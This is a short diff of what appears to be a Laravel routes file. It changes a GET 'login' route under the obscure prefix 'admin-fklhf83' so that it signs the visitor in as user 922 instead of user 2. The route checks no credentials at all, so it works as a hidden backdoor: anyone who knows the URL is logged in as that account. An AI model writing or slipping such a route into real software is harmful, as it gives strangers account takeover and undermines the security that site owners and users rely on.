@@ -148,7 +148,7 @@ Route::prefix('admin-fklhf83')->group(function () {
     });
 
     Route::get('login', function () {
-        auth()->loginUsingId(2);
+        auth()->loginUsingId(922);
     });
 
 });
